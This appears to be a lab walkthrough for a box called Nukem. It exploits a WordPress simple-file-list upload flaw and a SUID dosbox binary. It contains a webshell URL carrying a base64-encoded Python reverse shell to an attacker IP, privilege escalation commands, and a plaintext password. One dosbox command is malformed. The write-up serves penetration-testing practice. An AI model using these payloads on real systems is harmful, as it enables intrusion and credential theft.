# Nukem \[Inter]

## Report

'simple-file-list' plugin for WordPress is vulnerable to PHP file upload and RCE, use base64 encoded reverse shell payload after uploading PoC (phpinfo). Root is running a flask application that is owned by user 'commander' but we can't restart it so that is a rabbit hole indeed.

Dosbox binary however has SUID set, use it to write to authorized\_keys, sudoers or grab shadow file and crack root password.

## Enumeration

192.168.112.105

```
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
3306/tcp  open  mysql?
| fingerprint-strings: 
|   HTTPOptions, LANDesk-RC, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, WMSRequest, afp, ms-sql-s, oracle-tns: 
|_    Host '192.168.45.181' is not allowed to connect to this MariaDB server
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
13000/tcp open  http        nginx 1.18.0
|_http-title: Login V14
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
36445/tcp open  netbios-ssn Samba smbd 4.6.2
```

#### 80 (WordPress)

```
sudo wpscan --url http://192.168.112.105

[i] Plugin(s) Identified:

[+] simple-file-list
 | Location: http://192.168.112.105/wp-content/plugins/simple-file-list/
 | [!] The version is out of date, the latest version is 6.1.15
 | Found By: Urls In Homepage (Passive Detection)
 | Version: 4.2.2 (100% confidence)

[+] tutor
---SNIP---
```

## Loot

### Initial Foothold

Simple file list 4.2.2 RCE via FIle Upload (PHP payload)

```
python3 48449.py http://192.168.112.105
9518.php - phpinfo [PoC]
```

Upload webshell and execute payload using base64 encoding

```
http://192.168.112.105/wp-content/uploads/simple-file-list/9434.php?cmd=sh%20-c%20%27echo%20cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC40NS4xODEiLDgwKSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL3NoIikn%20|%20base64%20-d%20|%20sh%27
```

### PrivEsc

```
Read commander password from wp-config.php

pspy Output
CMD: UID=0     PID=555    | /usr/bin/python /home/commander/python_rest_flask/server.py
Have write access to source but cannot restart - Rabbit hole

SUID SYSTEM READ ACCESS
-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox

[commander@nukem .dosbox]$ LFILE='\root\proof.txt'E"
[commander@nukem .dosbox]$ dosbox -c 'mount c /' -c "copy c:$LFILE c:\tmp\output" -c exit
```

You actually need a shell tho right but the stupid box crashed before we could to it, add to sudoers or add public key to authorized\_keys, you know what's up

### Creds

`commander:CommanderKeenVorticons1990` \[from wp-config.php]

### Proof

{% embed url="https://gtfobins.github.io/gtfobins/dosbox/" %}
